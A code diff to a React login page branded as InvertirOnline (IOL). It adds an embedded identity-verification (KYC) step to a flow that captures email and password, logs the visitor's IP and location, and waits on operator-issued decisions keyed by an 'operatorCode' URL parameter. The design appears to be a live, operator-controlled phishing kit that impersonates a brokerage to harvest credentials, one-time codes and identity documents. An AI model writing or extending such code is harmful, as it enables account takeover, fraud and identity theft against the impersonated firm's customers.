@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useState } from "react";
+import { useCallback, useEffect, useMemo, useState } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
@@ -9,9 +9,10 @@ import WaitingScreen from "@/components/login/WaitingScreen";
 import SuccessScreen from "@/components/login/SuccessScreen";
 import OtpScreen from "@/components/login/OtpScreen";
 import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
+import WayniKycFlow from "@/components/kyc/WayniKycFlow";
 import iolLogo from "@/assets/iol-logo-v7.svg";
 
-type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email";
+type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "kyc";
 
 const IOL = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
@@ -23,6 +24,7 @@ const IOL = () => {
   const [generalError, setGeneralError] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [errorMessage, setErrorMessage] = useState("");
+  const [kycCaseId, setKycCaseId] = useState<string | null>(null);
 
   const rateLimit = useRateLimit();
 
@@ -48,20 +50,32 @@ const IOL = () => {
     };
   }, []);
 
-  const redirectToKyc = useCallback((link?: string, caseId?: string) => {
-    const nextUrl = link || (caseId ? `${window.location.origin}/kyc/${caseId}` : null);
-    if (!nextUrl) return;
-    window.location.assign(nextUrl);
+  const parseCaseIdFromLink = useCallback((link?: string | null) => {
+    if (!link) return null;
+    const cleanLink = link.trim();
+    const match = cleanLink.match(/\/kyc\/([^/?#]+)/i);
+    return match?.[1] || null;
   }, []);
+
+  const activateEmbeddedKyc = useCallback((payload?: { kyc_link?: string; kyc_case_id?: string } | string) => {
+    const resolvedCaseId = typeof payload === "string"
+      ? parseCaseIdFromLink(payload)
+      : payload?.kyc_case_id || parseCaseIdFromLink(payload?.kyc_link);
+
+    if (!resolvedCaseId) return;
+
+    setKycCaseId(resolvedCaseId);
+    setErrorMessage("");
+    setGeneralError("");
+    setStep("kyc");
+  }, [parseCaseIdFromLink]);
 
   const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
     const status = typeof payload === "string" ? payload : payload?.status;
     if (!status) return;
 
     if (status === "redirect_kyc") {
-      if (typeof payload !== "string") {
-        redirectToKyc(payload.kyc_link, payload.kyc_case_id);
-      }
+      activateEmbeddedKyc(payload);
       return;
     }
 
@@ -95,7 +109,7 @@ const IOL = () => {
       setErrorMessage("");
       setStep("waiting");
     }
-  }, [redirectToKyc]);
+  }, [activateEmbeddedKyc]);
 
   useEffect(() => {
     if (!sessionId || step === "form" || step === "success") return;
@@ -123,7 +137,7 @@ const IOL = () => {
 
       if (data?.status === "redirect_kyc") {
         const kycLink = data.otp_code?.startsWith("kyc_link:") ? data.otp_code.replace("kyc_link:", "") : undefined;
-        redirectToKyc(kycLink);
+        activateEmbeddedKyc(kycLink);
         return;
       }
 
@@ -137,13 +151,14 @@ const IOL = () => {
       supabase.removeChannel(otpChannel);
       window.clearInterval(pollInterval);
     };
-  }, [handleDecision, redirectToKyc, sessionId, step]);
+  }, [activateEmbeddedKyc, handleDecision, sessionId, step]);
 
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
     setErrorMessage("");
     setLoading(true);
     setEmail(submittedEmail);
+    setKycCaseId(null);
 
     try {
       let ipData = { ip: "unknown", country: "", city: "", region: "" };
@@ -213,11 +228,23 @@ const IOL = () => {
   const handleRetry = useCallback(() => {
     setStep("form");
     setSessionId(null);
+    setKycCaseId(null);
     setErrorMessage("");
     setGeneralError("");
   }, []);
 
+  const isKycStep = step === "kyc" && Boolean(kycCaseId);
+
+  const mainTitle = useMemo(() => {
+    if (isKycStep) return "Validación de identidad";
+    return "Ingresa a tu cuenta";
+  }, [isKycStep]);
+
   const renderCardContent = () => {
+    if (step === "kyc" && kycCaseId) {
+      return <WayniKycFlow caseId={kycCaseId} embedded brandLabel="IOL" />;
+    }
+
     if (step === "otp" && sessionId) {
       return <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
     }
@@ -277,29 +304,31 @@ const IOL = () => {
   return (
     <div className="iol-theme min-h-screen bg-background text-foreground">
       <header className="iol-topbar-shadow border-b border-border/80 bg-background">
-        <div className="mx-auto flex h-[58px] w-full max-w-5xl items-center justify-center px-5 sm:px-8 lg:justify-start">
+        <div className="mx-auto flex h-[58px] w-full max-w-6xl items-center justify-center px-5 sm:px-8 lg:justify-start">
           <img src={iolLogo} alt="InvertirOnline" className="h-8 w-auto object-contain" />
         </div>
       </header>
 
-      <main className="mx-auto flex w-full max-w-5xl flex-col px-5 pb-12 pt-10 sm:px-8 lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:pt-14 lg:pb-16">
-        <section className="w-full max-w-[350px] lg:pt-8">
-          <h1 className="mb-3 text-[2rem] font-semibold leading-none text-primary sm:text-[2.15rem]">
-            Ingresa a tu cuenta
+      <main className={`mx-auto flex w-full max-w-6xl flex-col px-5 pb-12 pt-10 sm:px-8 lg:pb-16 ${isKycStep ? "lg:pt-10" : "lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:pt-14"}`}>
+        <section className={`w-full ${isKycStep ? "max-w-none" : "max-w-[350px] lg:pt-8"}`}>
+          <h1 className={`mb-3 font-semibold leading-none text-primary ${isKycStep ? "text-[2.15rem] sm:text-[2.5rem]" : "text-[2rem] sm:text-[2.15rem]"}`}>
+            {mainTitle}
           </h1>
 
-          <div className="iol-card-shadow rounded-2xl bg-card px-6 py-7 sm:px-7">
+          <div className={`iol-card-shadow rounded-2xl bg-card ${isKycStep ? "px-4 py-4 sm:px-6 sm:py-6" : "px-6 py-7 sm:px-7"}`}>
             {renderCardContent()}
           </div>
         </section>
 
-        <section className="flex flex-1 justify-center pt-10 lg:justify-end lg:pt-6">
-          <IolIllustration />
-        </section>
+        {!isKycStep && (
+          <section className="flex flex-1 justify-center pt-10 lg:justify-end lg:pt-6">
+            <IolIllustration />
+          </section>
+        )}
       </main>
 
       <footer className="border-t border-border/60 bg-background lg:hidden">
-        <div className="mx-auto flex w-full max-w-5xl justify-center px-5 py-5 sm:px-8">
+        <div className="mx-auto flex w-full max-w-6xl justify-center px-5 py-5 sm:px-8">
           <img src={iolLogo} alt="InvertirOnline" className="h-7 w-auto object-contain" />
         </div>
       </footer>
@@ -308,4 +337,3 @@ const IOL = () => {
 };
 
 export default IOL;
-
